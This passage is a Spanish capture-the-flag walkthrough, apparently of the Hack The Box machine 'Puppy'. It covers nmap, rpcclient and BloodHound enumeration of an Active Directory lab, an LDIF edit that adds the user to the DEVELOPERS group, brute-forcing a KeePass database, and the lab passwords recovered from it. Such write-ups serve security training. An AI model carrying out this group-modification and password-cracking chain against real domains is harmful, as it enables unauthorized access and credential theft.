Lo primero que haremos sera realizar un escaneo con nmap
```bash
└─# nmap -p- --open -sS -sV -T5 -n -Pn 10.10.11.70
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 08:02 EDT
Nmap scan report for 10.10.11.70
Host is up (0.053s latency).
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-11 19:03:33Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
52611/tcp open  msrpc         Microsoft Windows RPC
52647/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.84 seconds
```

Nos proporcionaran las credenciales del usuario levi.james, procederemos a enumerar los usuarios mediante rpcclient, posteriormente los almacenaremos en un txt por si posteriormente lo necesitamos.
```bash
└─# rpcclient -U levi.james%KingofAkron2025! -W puppy.htb 10.10.11.70
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

Ahora sincronizaremos la hora con el dominio para evitar posibles problemas, es importante tener la IP apuntando correctamente al dominio en el fichero /etc/hosts
```bash
└─# ntpdate puppy.htb
2025-07-11 13:06:14.736452 (-0400) +25200.486878 +/- 0.026779 puppy.htb 10.10.11.70 s1 no-leap
CLOCK: time stepped by 25200.486878
```

Generearemos un archivo que podamos visualizar en bloodhound
```bash                                                                                                                                                                                                                                           
┌──(root㉿kali)-[~/THM/Puppy]
└─# bloodhound-python -u 'levi.james' -p 'KingofAkron2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 11S
INFO: Compressing output into 20250711060801_bloodhound.zip
```
Si recordamos cuando enumeramos los directorios de smb uno de ellos nos decia que era accesible por puppy devs

<img width="678" height="297" alt="image" src="https://github.com/user-attachments/assets/e5fd618d-0942-42b6-999e-a8d0b849f8d8" />

Desde Bloodhound podemos ver como tenemos permisos para modificar el grupo de devs, por lo tanto procederemos a añadirnos al grupo de devs.

<img width="1002" height="135" alt="image" src="https://github.com/user-attachments/assets/b8601b89-0ed2-4b96-9c0c-529e275d9e49" />

Ahora pasaremos a ejecutar el comando ldapsearch, esto con la finalidad de obtener el dn tanto del usuario del que tenemos credenciales como del grupo al que lo queremos añadir.

```bash
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=levi.james)"
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=levi.james)
# requesting: ALL
#

# Levi B. James, MANPOWER, PUPPY.HTB
dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Levi B. James
sn: James
givenName: Levi
initials: B
distinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
instanceType: 4
whenCreated: 20250219121056.0Z
whenChanged: 20250711141817.0Z
displayName: Levi B. James
uSNCreated: 12798
memberOf: CN=HR,DC=PUPPY,DC=HTB
uSNChanged: 172196
name: Levi B. James
objectGUID:: 2UDSk6IBfU2UQ8vUlLk8rg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133862719957678511
lastLogoff: 0
lastLogon: 133967278104209708
pwdLastSet: 133844406569969717
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHTwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: levi.james
sAMAccountType: 805306368
managedObjects: OU=MANPOWER,DC=PUPPY,DC=HTB
userPrincipalName: levi.james@PUPPY.HTB
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
dSCorePropagationData: 20250509173106.0Z
dSCorePropagationData: 20250219131504.0Z
dSCorePropagationData: 16010101000416.0Z
lastLogonTimestamp: 133967170971710058
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
```bash
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=developers)" dn
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=developers)
# requesting: dn 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
Una vez obtenidos ambos dn procederemos a crear un archivo ldif que se encargue de añadir el usuario al grupo correspondiente

```bash
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```
Ahora ejecutaremos el archivo ldif, y verificaremos que seamos miembros del grupo
```bash
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "CN=DEVELOPERS,DC=PUPPY,DC=HTB" member
# extended LDIF
#
# LDAPv3
# base <CN=DEVELOPERS,DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB
member: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
member: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
```bash
└─# ldapmodify -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -f mod.ldif
modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
```
```bash                                                                                                             
┌──(root㉿kali)-[~/THM/Puppy]
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "CN=DEVELOPERS,DC=PUPPY,DC=HTB
# extended LDIF
#
# LDAPv3
# base <CN=DEVELOPERS,DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB
member: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
member: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Ahora veremos que tenemos acceso a la carpeta DEV, procederemos a descargar su contenido.
```bash
└─# smbclient  //puppy.htb/DEV -U levi.james
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1639843 blocks available
smb: \>
```
Le haremos un ataque de fuerza bruta, peor no podremos hacerlo con keepass2john, ya que no soporta la versión, por lo tanto, descargaremos un script de github para realizarl el ataque de fuerza bruta llamado keepass4brute
```bash
└─# ./keepass4brute.sh DEV/recovery.kdbx /usr/share/wordlists/rockyou.txt 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 26 - Estimated time remaining: 54 weeks, 5 days
[+] Current attempt: liverpool

[*] Password found: liverpool
                                                                                                                    
┌──(root㉿kali)-[~/THM/Puppy]
```
Con wine podremos ejecutar el exe de keepass anteriormente extraido con msiextract
```
ADAM SILVER - HJKL2025!
ANTONY C. EDWARDS - Antman2025!
JAMIE WILLIAMSON - JamieLove2025!
SAMUEL BLAKE - ILY2025!
STEVE TUCKER - Steve2025!
```
